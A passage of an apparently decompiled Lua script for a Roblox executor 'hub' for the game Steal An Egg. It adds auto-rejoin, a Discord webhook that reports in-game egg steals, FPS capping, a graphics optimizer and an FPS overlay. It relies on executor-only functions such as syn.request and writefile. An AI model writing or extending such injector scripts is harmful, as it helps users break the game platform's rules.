		local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
		local promptOverlay = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
		return promptOverlay ~= nil and promptOverlay:FindFirstChild("ErrorPrompt") ~= nil
	end

	pcall(function()
		local connection = localPlayer.OnTeleport:Connect(function(arg)
			if arg == Enum.TeleportState.Failed then
				tbl15.TeleportingAt = 0
			else
				tbl15.TeleportingAt = os.clock()
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	tbl15.Option = v13:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

	local function fn22(arg)
		if tbl15.Fired or tbl15.Option == nil or not tbl3.Toggle(tbl15.Option, false) or fn15() then
			return
		end
		local flag2 = tbl15.TeleportingAt > 0

		if flag2 then
			local teleportingAt = tbl15.TeleportingAt
			flag2 = os.clock() - teleportingAt < 60
		end

		if flag2 then
			return
		end
		local v15 = string.lower(tostring(arg or ""))
		if v15 == "" or string.find(v15, "teleport", 1, true) then
			return
		end
		local errorCode = nil

		pcall(function()
			errorCode = GuiService:GetErrorCode()
		end)

		if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(v15, "banned", 1, true) or string.find(v15, "same account", 1, true) then
			return
		end
		tbl15.Fired = true
		local placeId = game.PlaceId
		local str2 = tostring(game.JobId or "")
		local flag3 = string.find(v15, "shut", 1, true) ~= nil or string.find(v15, "no longer", 1, true) ~= nil or string.find(v15, "closed", 1, true) ~= nil
		pcall(AutoLoadBeforeTeleport)
		fn14("Auto Rejoin", flag3 and "Server closed, joining another one." or "Disconnected, rejoining now.")

		task.spawn(function()
			local n15 = 0

			while true do
				n15 += 1
				local flag4 = not flag3 and str2 ~= "" and n15 <= 2

				pcall(function()
					if flag4 then
						TeleportService:TeleportToPlaceInstance(placeId, str2, localPlayer)
					else
						TeleportService:Teleport(placeId, localPlayer)
					end
				end)

				task.wait(flag4 and 4 or 5)
			end
		end)
	end

	pcall(function()
		local connection = GuiService.ErrorMessageChanged:Connect(function(arg)
			task.wait(0.3)

			if fn21() then
				fn22(arg)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	task.spawn(function()
		local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
		local promptOverlay = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
		if not promptOverlay then
			return
		end

		local connection = promptOverlay.ChildAdded:Connect(function(child)
			if child.Name ~= "ErrorPrompt" then
				return
			end
			task.wait(0.2)
			local str2 = ""

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
					str2 = descendant.Text
				end
			end

			if str2 == "" then
				pcall(function()
					str2 = GuiService:GetErrorMessage()
				end)
			end

			fn22(str2 ~= "" and str2 or "disconnected")
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)
end

do
	local AssetService = game:GetService("AssetService")
	local request_ = syn and syn.request or http and http.request or http_request or request

	local tbl15 = {
		Url = "",
		Stolen = false,
		PingEveryone = false,
		Queue = {},
		Sending = false,
		Notified = {},
		Icons = {},
		Pngs = {},
		Crc = {},
		Known = nil,
		Carry = nil,
		Avatar = nil,
		Disposed = false,
		Path = "ChilliLibrary/SAE_Webhook.txt",
		Saved = "",
		LoadedAt = os.clock(),
		Input = nil,
		Dot = "  " .. utf8.char(183) .. "  ",
		MaxSide = 200,
		Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
		Emoji = {
			Value = "<:sae_value:1551645680718581871>",
			Size = "<:sae_size:1551645444285800558>",
			Mutation = "<:sae_mutation:1551677914146275478>",
			Area = "<:sae_area:1551675973328441416>",
		},
	}

	pcall(function()
		if type(readfile) ~= "function" then
			return
		end

		if type(isfile) == "function" and not isfile(tbl15.Path) then
			return
		end
		local v14 = string.gsub(tostring(readfile(tbl15.Path) or ""), "%s", "")
		tbl15.Saved = v14
		tbl15.Url = v14
	end)

	for i = 0, 255 do
		local v14 = i

		for i2 = 1, 8 do
			if bit32.band(v14, 1) == 1 then
				v14 = bit32.bxor(3988292384, bit32.rshift(v14, 1))
			else
				v14 = bit32.rshift(v14, 1)
			end
		end

		tbl15.Crc[i] = v14
	end

	local function fn15(arg)
		if type(arg) ~= "string" then
			return false
		end

		for _, v14 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
			if string.match(arg, "^https://" .. v14 .. "/api/webhooks/%d+/[%w%-_]+$") then
				return true
			end
		end

		return false
	end

	local function fn16(arg)
		if type(request_) ~= "function" then
			return nil
		end
		local ok, result = pcall(request_, { Url = arg, Method = "GET" })
		if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
		return ok2 and result2 or nil
	end

	local function fn17(arg, arg2)
		local flag2 = type(arg) == "table" and type(arg.data) == "table" and arg.data[1] or nil
		if type(flag2) ~= "table" or flag2.state ~= "Completed" or type(flag2.imageUrl) ~= "string" or flag2.imageUrl == "" then
			return nil
		end

		if arg2 and not string.find(flag2.imageUrl, "/Image/", 1, true) then
			return nil
		end
		return flag2.imageUrl
	end

	local function fn18(arg)
		if tbl15.Icons[arg] == nil then
			tbl15.Icons[arg] = fn17(fn16("https://thumbnails.roblox.com/v1/assets?assetIds=" .. arg .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
		end

		return tbl15.Icons[arg] or nil
	end

	local function fn19()
		if tbl15.Avatar == nil then
			tbl15.Avatar = fn17(fn16("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
		end

		return tbl15.Avatar or nil
	end

	local function fn20(arg, arg2, arg3)
		local crc = tbl15.Crc
		local n13 = 4294967295

		for i = arg2, arg3 do
			local rshift = bit32.rshift
			n13 = bit32.bxor(crc[bit32.band(bit32.bxor(n13, buffer.readu8(arg, i)), 255)], rshift(n13, 8))
		end

		return bit32.bxor(n13, 4294967295)
	end

	local function fn21(arg, arg2, arg3)
		local n13 = arg2 * 4 + 1
		local n14 = n13 * arg3
		local n15 = 2 + math.ceil(n14 / 65535) * 5 + n14 + 4
		local v14 = buffer.create(45 + n15 + 12)
		local n16 = 0

		local function fn22(arg4)
			buffer.writeu8(v14, n16, arg4)
			n16 += 1
		end

		local function fn23(arg4)
			fn22(bit32.band(bit32.rshift(arg4, 24), 255))
			fn22(bit32.band(bit32.rshift(arg4, 16), 255))
			fn22(bit32.band(bit32.rshift(arg4, 8), 255))
			fn22(bit32.band(arg4, 255))
		end

		local function fn24(arg4, arg5, arg6, arg7)
			fn22(arg4)
			fn22(arg5)
			fn22(arg6)
			fn22(arg7)
		end

		for _, v15 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
			fn22(v15)
		end

		fn23(13)
		fn24(73, 72, 68, 82)
		fn23(arg2)
		fn23(arg3)
		fn22(8)
		fn22(6)
		fn22(0)
		fn22(0)
		fn22(0)
		fn23(fn20(v14, n16, n16 - 1))
		local v15 = buffer.create(n14)

		for i = 0, arg3 - 1 do
			buffer.writeu8(v15, i * n13, 0)
			buffer.copy(v15, i * n13 + 1, arg, i * arg2 * 4, arg2 * 4)
		end

		fn23(n15)
		local v16 = n16
		fn24(73, 68, 65, 84)
		fn22(120)
		fn22(1)
		local n17 = 0

		while n17 < n14 do
			local n18 = math.min(65535, n14 - n17)
			fn22(n17 + n18 >= n14 and 1 or 0)
			fn22(bit32.band(n18, 255))
			fn22(bit32.rshift(n18, 8))
			local v17 = bit32.band(bit32.bnot(n18), 65535)
			fn22(bit32.band(v17, 255))
			fn22(bit32.rshift(v17, 8))
			buffer.copy(v14, n16, v15, n17, n18)
			n16 += n18
			n17 += n18
		end

		local n18 = 1
		local n19 = 0

		for i = 0, n14 - 1 do
			n18 = (n18 + buffer.readu8(v15, i)) % 65521
			n19 = (n19 + n18) % 65521
		end

		fn23(n19 * 65536 + n18)
		fn23(fn20(v14, v16, n16 - 1))
		fn23(0)
		fn24(73, 69, 78, 68)
		fn23(fn20(v14, n16, n16 - 1))
		return buffer.tostring(v14)
	end

	local function fn22(arg)
		if tbl15.Pngs[arg] ~= nil then
			return tbl15.Pngs[arg] or nil
		end

		local ok, result = pcall(function()
			local v14 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. arg))
			local size = v14.Size
			local n13 = math.floor(size.X)
			local n14 = math.floor(size.Y)
			local v15 = v14:ReadPixelsBuffer(Vector2.zero, size)

			pcall(function()
				v14:Destroy()
			end)

			local n15 = math.min(1, tbl15.MaxSide / math.max(n13, n14))
			local n16 = math.max(1, math.floor(n13 * n15))
			local n17 = math.max(1, math.floor(n14 * n15))
			local v16 = buffer.create(n16 * n17 * 4)

			for i = 0, n17 - 1 do
				local n18 = math.min(n14 - 1, math.floor(i / n15))

				for i2 = 0, n16 - 1 do
					buffer.copy(v16, (i * n16 + i2) * 4, v15, (n18 * n13 + math.min(n13 - 1, math.floor(i2 / n15))) * 4, 4)
				end
			end

			return fn21(v16, n16, n17)
		end)

		tbl15.Pngs[arg] = ok and type(result) == "string" and result or false
		return tbl15.Pngs[arg] or nil
	end

	local function fn23(arg, arg2)
		if arg2 then
			return 13686498
		end

		if typeof(arg) ~= "Color3" then
			return 5793266
		end
		return math.floor(arg.R * 255 + 0.5) * 65536 + math.floor(arg.G * 255 + 0.5) * 256 + math.floor(arg.B * 255 + 0.5)
	end

	local function fn24(arg)
		local tbl16 = {}

		if type(arg) == "table" then
			for _, v14 in ipairs(arg) do
				tbl16[#tbl16 + 1] = fn6(v14)
			end
		end

		return #tbl16 > 0 and table.concat(tbl16, ", ") or "None"
	end

	local function fn25(arg)
		local areas = tbl.Areas
		local directory = type(areas) == "table" and (areas.Directory or areas) or nil
		local str = tostring(arg or "")
		local flag2 = type(directory) == "table" and str ~= "" and directory[str] or nil
		if type(flag2) == "table" then
			return tostring(flag2.DisplayName or str)
		end
		return str ~= "" and str or "Field"
	end

	local function fn26(arg, arg2, arg3, arg4, arg5, arg6)
		local str = tostring(arg2)
		local v14 = tbl10.AssetInfo(str)
		local n13 = tonumber(arg3) or 1
		arg4 = type(arg4) == "table" and arg4 or {}
		local v15 = tbl10.Income(v14, n13, arg4)
		local dot = tbl15.Dot
		local str2 = string.format("x%.2f", n13)
		local eggRecords = tbl.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
			local ok, result = pcall(eggRecords.WeightKgForScale, str, n13)

			if ok and tonumber(result) then
				str2 ..= dot .. tbl10.FormatWeight(result)
			end
		end

		local emoji = tbl15.Emoji
		local tbl16 = {}
		local str3 = "**" .. tostring(v14.Name) .. "**" .. dot .. tostring(v14.Rarity)
		local str4 = emoji.Value .. " **Value:** $" .. tbl10.FormatRate(v15)
		local str5 = emoji.Size .. " **Size:** " .. str2
		local str6 = emoji.Mutation .. " **Mutation:** " .. fn24(arg4)
		local str7 = emoji.Area .. " **Area:** " .. fn25(arg5)
		tbl16[1] = str3
		tbl16[2] = str4
		tbl16[3] = str5
		tbl16[4] = str6
		tbl16[5] = str7

		local tbl17 = {
			author = { name = localPlayer.DisplayName, icon_url = fn19() },
			title = arg,
			description = table.concat(tbl16, "\n"),
			color = fn23(v14.Color, string.upper(tostring(v14.Rarity)) == "SECRET"),
			footer = { text = "Chilli Hub" .. dot .. "Steal An Egg", icon_url = tbl15.Logo },
			timestamp = DateTime.now():ToIsoDate(),
		}

		local tbl18 = { username = "Chilli Hub", avatar_url = tbl15.Logo, embeds = { tbl17 } }
		local icon = v14.Icon

		if arg6 then
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag2 = type(directory) == "table" and directory[str] or nil
			local egg = type(flag2) == "table" and type(flag2.Egg) == "table" and flag2.Egg or nil

			if egg and egg.Icon ~= nil then
				icon = egg.Icon
			end
		end

		local num = tonumber(string.match(tostring(icon or ""), "(%d+)"))
		local v16 = num and fn22(num) or nil
		local flag2 = num and not v16 and fn18(num) or nil

		if v16 then
			tbl17.thumbnail = { url = "attachment://egg.png" }
			tbl18.attachments = { { id = 0, filename = "egg.png" } }
		elseif flag2 then
			tbl17.thumbnail = { url = flag2 }
		end

		return tbl18, v16
	end

	local function fn27()
		if tbl15.Sending then
			return
		end
		tbl15.Sending = true

		task.spawn(function()
			while #tbl15.Queue > 0 and not tbl15.Disposed do
				local v14 = table.remove(tbl15.Queue, 1)

				if fn15(tbl15.Url) and type(request_) == "function" then
					local tbl16 = { Url = tbl15.Url, Method = "POST" }

					if v14.Png then
						local str = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
						tbl16.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str }
						local concat = table.concat
						local tbl17 = {}
						local png = v14.Png
						local json = HttpService:JSONEncode(v14.Payload)
						tbl17[1] = "--"
						tbl17[2] = str
						tbl17[3] = "\r\n"
						tbl17[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
						tbl17[5] = "Content-Type: application/json\r\n\r\n"
						tbl17[6] = json
						tbl17[7] = "\r\n"
						tbl17[8] = "--"
						tbl17[9] = str
						tbl17[10] = "\r\n"
						tbl17[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
						tbl17[12] = "Content-Type: image/png\r\n\r\n"
						tbl17[13] = png
						tbl17[14] = "\r\n"
						tbl17[15] = "--"
						tbl17[16] = str
						tbl17[17] = "--\r\n"
						tbl16.Body = concat(tbl17)
					else
						tbl16.Headers = { ["Content-Type"] = "application/json" }
						tbl16.Body = HttpService:JSONEncode(v14.Payload)
					end

					local ok, result = pcall(request_, tbl16)
					ok = ok and type(result) == "table" and tonumber(result.StatusCode) or nil

					if ok == 429 and v14.Tries < 3 then
						v14.Tries = v14.Tries + 1
						table.insert(tbl15.Queue, 1, v14)
						task.wait(3)
					elseif ok ~= 200 and ok ~= 204 and v14.Png then
						v14.Png = nil
						v14.Payload.attachments = nil
						local flag2 = type(v14.Payload.embeds) == "table" and v14.Payload.embeds[1] or nil

						if flag2 then
							flag2.thumbnail = nil
						end

						table.insert(tbl15.Queue, 1, v14)
					end
				end

				task.wait(1.2)
			end

			tbl15.Sending = false
		end)
	end

	local function fn28()
		return type(request_) == "function" and fn15(tbl15.Url)
	end

	local function fn29(arg, arg2)
		if #tbl15.Queue >= 20 then
			table.remove(tbl15.Queue, 1)
		end

		if tbl15.PingEveryone and type(arg) == "table" then
			arg.content = "@everyone"
			arg.allowed_mentions = { parse = { "everyone" } }
		end

		table.insert(tbl15.Queue, { Payload = arg, Png = arg2, Tries = 0 })
		fn27()
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			if type(arg) ~= "table" then
				return
			end

			if arg.IsCarrying then
				tbl15.Carry = {
					Category = tostring(arg.AssetCategory),
					Uid = tostring(arg.Uid),
					Area = tostring(arg.AreaId or "Field"),
					EndedAt = nil,
				}
			elseif tbl15.Carry then
				tbl15.Carry.EndedAt = os.clock()
			end
		end)

		if ok and result then
			fn4(function()
				pcall(function()
					result:Disconnect()
				end)
			end)
		end
	end

	fn4(function()
		tbl15.Disposed = true
	end)

	task.spawn(function()
		while not tbl15.Disposed do
			local flag2 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
			local flag3 = false
			local result = nil

			if flag2 then
				flag3, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			end

			if flag3 and type(result) == "table" then
				local known = tbl15.Known
				local tbl16 = {}
				local known2 = {}

				for k, v14 in pairs(result) do
					local str = tostring(k)
					known2[str] = true

					if known and not known[str] and type(v14) == "table" then
						tbl16[#tbl16 + 1] = { Uid = str, Record = v14 }
					end
				end

				tbl15.Known = known2
				local carry = tbl15.Carry

				if tbl15.Stolen and carry and #tbl16 > 0 then
					for _, v14 in ipairs(tbl16) do
						local record = v14.Record
						local flag4 = carry.EndedAt == nil

						if not flag4 then
							local endedAt = carry.EndedAt
							flag4 = os.clock() - endedAt < 20
						end

						if flag4 then
							flag4 = v14.Uid == carry.Uid

							if not flag4 then
								local category = carry.Category
								flag4 = tostring(record.AssetCategory) == category
							end
						end

						if flag4 then
							tbl15.Carry = nil
							local mutations = type(record.Mutations) == "table" and record.Mutations or {}

							task.spawn(function()
								if fn28() then
									fn29(fn26("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
								end
							end)

							break
						end
					end
				end
			end

			task.wait(1.5)
		end
	end)

	local function fn30(arg)
		local input = tbl15.Input
		if type(input) ~= "table" then
			return
		end

		for _, v14 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return input[v14]
			end)

			if ok and type(result) == "function" and pcall(result, input, arg, false) then
				return
			end
		end
	end

	tbl15.Input = v9:CreateInput({
		Name = "Webhook URL",
		Placeholder = "https://discord.com/api/webhooks/...",
		Default = tbl15.Saved,
		MaxLength = 256,
		Callback = function(arg)
			local v14 = string.gsub(tostring(arg or ""), "%s", "")
			local flag2 = v14 == "" and tbl15.Saved ~= ""

			if flag2 then
				local loadedAt = tbl15.LoadedAt
				flag2 = os.clock() - loadedAt < 5
			end

			if flag2 then
				tbl15.Url = tbl15.Saved
				task.defer(fn30, tbl15.Saved)
				return
			end

			tbl15.Url = v14

			if (v14 == "" or fn15(v14)) and v14 ~= tbl15.Saved and type(writefile) == "function" then
				if pcall(writefile, tbl15.Path, v14) then
					tbl15.Saved = v14
				end
			end
		end,
	})

	v9:CreateToggle({
		Name = "Ping @everyone",
		Default = false,
		Callback = function(arg)
			tbl15.PingEveryone = arg == true
		end,
	})

	v9:CreateToggle({
		Name = "Notify Stolen Eggs",
		Note = "Post every egg you bring home",
		Default = false,
		Callback = function(arg)
			tbl15.Stolen = arg == true
		end,
	})
end

local v14
v14 = v2:CreateTab({ Name = "Misc", SectionsExpanded = true })
local v15
v15 = v14:CreateSection({ Name = "Performance", Expanded = true })
local flag2 = false

v15:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Callback = function(arg)
		local n13 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)
		if type(setfpscap) == "function" and pcall(setfpscap, n13) then
			flag2 = false
			return
		end

		if not flag2 then
			flag2 = true
			fn14("FPS Cap Unavailable", "This environment does not support setfpscap.")
		end
	end,
})

do
	local Lighting = game:GetService("Lighting")
	local n13 = 0.003
	local flag3 = false
	local n14 = 0
	local thread = nil
	local tbl15 = {}
	local tbl16 = {}
	local obj = setmetatable({}, { __mode = "k" })
	local tbl17 = {}
	local connection = nil

	local function fn15(arg, arg2, arg3)
		local ok, result = pcall(arg)
		if not ok then
			return
		end
		tbl16[#tbl16 + 1] = { Setter = arg2, Value = result }
		pcall(arg2, arg3)
	end

	local function fn16(arg, arg2, arg3)
		local tbl18 = obj[arg]

		if not tbl18 then
			tbl18 = {}
			obj[arg] = tbl18
		end

		if tbl18[arg2] == nil then
			local ok, result = pcall(function()
				return arg[arg2]
			end)

			if not ok then
				return
			end
			tbl18[arg2] = { Value = result }
		end

		pcall(function()
			arg[arg2] = arg3
		end)
	end

	local function fn17(arg)
		if not flag3 or not arg.Parent then
			return
		end

		if arg:IsA("ParticleEmitter") then
			fn16(arg, "Enabled", false)
			fn16(arg, "Rate", 0)
		elseif arg:IsA("Trail") or arg:IsA("Beam") then
			fn16(arg, "Enabled", false)
		elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
			fn16(arg, "Enabled", false)
			fn16(arg, "Brightness", 0)
		elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
			fn16(arg, "Enabled", false)
		elseif arg:IsA("Explosion") then
			fn16(arg, "Visible", false)
		elseif arg:IsA("SpecialMesh") then
			fn16(arg, "TextureId", "")
		elseif arg:IsA("Decal") or arg:IsA("Texture") then
			if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
				fn16(arg, "Transparency", 1)
			end
		elseif arg:IsA("MeshPart") then
			fn16(arg, "RenderFidelity", Enum.RenderFidelity.Performance)
			fn16(arg, "TextureID", "")
			fn16(arg, "CastShadow", false)
			fn16(arg, "Reflectance", 0)
			fn16(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("BasePart") then
			fn16(arg, "CastShadow", false)
			fn16(arg, "Reflectance", 0)
			fn16(arg, "Material", Enum.Material.SmoothPlastic)
		elseif arg:IsA("PostEffect") then
			fn16(arg, "Enabled", false)
		elseif arg:IsA("Clouds") then
			fn16(arg, "Cover", 0)
			fn16(arg, "Density", 0)
		elseif arg:IsA("Atmosphere") then
			fn16(arg, "Density", 0)
			fn16(arg, "Haze", 0)
			fn16(arg, "Glare", 0)
		end
	end

	local function fn18()
		for _, v16 in ipairs(tbl15) do
			if v16.Connected then
				v16:Disconnect()
			end
		end

		table.clear(tbl15)

		if connection then
			pcall(function()
				connection:Disconnect()
			end)

			connection = nil
		end
	end

	local function fn19()
		local rendering = settings().Rendering
		local terrain = workspace.Terrain

		local function fn20(arg, arg2, arg3)
			fn15(function()
				return arg[arg2]
			end, function(arg4)
				arg[arg2] = arg4
			end, arg3)
		end

		fn20(rendering, "QualityLevel", Enum.QualityLevel.Level01)
		fn20(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
		fn20(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)

		local ok, result = pcall(function()
			return UserSettings():GetService("UserGameSettings")
		end)

		if ok and result then
			fn20(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
		end

		fn20(Lighting, "GlobalShadows", false)
		fn20(Lighting, "ShadowSoftness", 0)
		fn20(Lighting, "FogEnd", 9e9)
		fn20(Lighting, "Technology", Enum.Technology.Legacy)
		fn20(Lighting, "EnvironmentDiffuseScale", 0)
		fn20(Lighting, "EnvironmentSpecularScale", 0)
		fn20(terrain, "Decoration", false)
		fn20(terrain, "WaterWaveSize", 0)
		fn20(terrain, "WaterWaveSpeed", 0)
		fn20(terrain, "WaterReflectance", 0)
		fn20(terrain, "WaterTransparency", 1)
	end

	local function fn20(arg, arg2)
		local now = os.clock()

		for _, descendant in ipairs(arg:GetDescendants()) do
			if not flag3 or n14 ~= arg2 then
				return false
			end
			fn17(descendant)

			if os.clock() - now > n13 then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end

		return true
	end

	local function fn21()
		if not flag3 or #tbl17 == 0 then
			return
		end
		local now = os.clock()

		while #tbl17 > 0 do
			local v16 = table.remove(tbl17)
			fn17(v16)
			if not (n13 < os.clock() - now) then
				continue
			end
			break
		end
	end

	local function fn22()
		local now = os.clock()

		for k, v16 in pairs(obj) do
			if k.Parent then
				for k2, v17 in pairs(v16) do
					pcall(function()
						k[k2] = v17.Value
					end)
				end
			end

			obj[k] = nil

			if os.clock() - now > n13 then
				RunService.Heartbeat:Wait()
				now = os.clock()
			end
		end
	end

	local function fn23()
		if not flag3 then
			return
		end
		flag3 = false
		n14 += 1
		fn18()
		table.clear(tbl17)

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		fn22()

		for i = #tbl16, 1, -1 do
			local v16 = tbl16[i]
			pcall(v16.Setter, v16.Value)
		end

		table.clear(tbl16)
	end

	local function fn24()
		if flag3 then
			return
		end
		flag3 = true
		n14 += 1
		local v16 = n14
		fn19()

		local function fn25(arg)
			tbl15[#tbl15 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if flag3 and n14 == v16 then
					tbl17[#tbl17 + 1] = descendant
				end
			end)
		end

		fn25(workspace)
		fn25(Lighting)

		connection = RunService.Heartbeat:Connect(function()
			if flag3 and n14 == v16 then
				fn21()
			end
		end)

		thread = task.spawn(function()
			if fn20(workspace, v16) then
				fn20(Lighting, v16)
			end
		end)
	end

	fn4(fn23)

	v15:CreateToggle({
		Name = "Optimizer",
		Note = "Strip shadows, textures and effects for the highest FPS",
		Default = false,
		Callback = function(arg)
			if arg then
				fn24()
			else
				task.spawn(fn23)
			end
		end,
	})
end

do
	local Stats = game:GetService("Stats")
	local n13 = 132
	local n14 = 0.085
	local n15 = 0.2
	local n16 = 8
	local v16 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })

	local function fn15()
		local v17 = v16:Get()
		if type(v17) == "table" and type(v17.XOffset) == "number" and type(v17.YOffset) == "number" then
			return UDim2.new(tonumber(v17.XScale) or 0, v17.XOffset, tonumber(v17.YScale) or 0, v17.YOffset)
		end
		return UDim2.new(0, 16, 0, 16)
	end

	local function fn16(arg)
		v16:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
	end

	local color3 = Color3.fromRGB(58, 255, 55)
	local color4 = Color3.fromRGB(255, 214, 84)
	local color5 = Color3.fromRGB(255, 96, 96)
	local color6 = Color3.fromRGB(150, 150, 158)
	local flag3 = false
	local tbl15 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local v17 = nil
	local v18 = nil
	local n17 = 1
	local n18 = 0
	local n19 = 0
	local v19 = nil
	local v20 = nil
	local font = nil

	pcall(function()
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function fn17(arg)
		if arg >= 100 then
			return color3
		end

		if arg >= 50 then
			return color4
		end
		return color5
	end

	local function fn18(arg)
		if arg <= 90 then
			return color3
		end

		if arg <= 180 then
			return color4
		end
		return color5
	end

	local function fn19()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n14 / n13, 0.7, 1.4) * n17
	end

	local function fn20()
		for _, v21 in ipairs(tbl15) do
			pcall(function()
				v21:Disconnect()
			end)
		end

		table.clear(tbl15)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		v17 = nil
		v18 = nil
		v19 = nil
		v20 = nil
		n18 = 0
	end

	local function createTextLabel(parent, arg, arg2, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = fn3()
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if font then
			textLabel.FontFace = font
		else
			textLabel.Font = Enum.Font.GothamBold
		end

		textLabel.Parent = parent
		return textLabel
	end

	local function fn21()
		fn20()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.Active = true
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = fn15()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0, 12)
		uiCorner.Parent = frame
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = fn3()
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn19()
		v17 = createTextLabel(frame, 12, 34, color3)
		createTextLabel(frame, 48, 22, color6).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.Name = fn3()
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		v18 = createTextLabel(frame, 82, 30, color3)
		createTextLabel(frame, 113, 14, color6).Text = "ms"
		screenGui.Parent = v3
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl15[#tbl15 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn19)
		end

		local flag4 = false
		local v21 = nil
		local vector2 = Vector2.zero
		local position = nil

		tbl15[#tbl15 + 1] = frame.InputBegan:Connect(function(input)
			if flag4 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local flag5 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag5 then
				return
			end
			flag4 = true
			v21 = flag5 and input or nil
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
		end)

		tbl15[#tbl15 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag4 or not frame or not position then
				return
			end

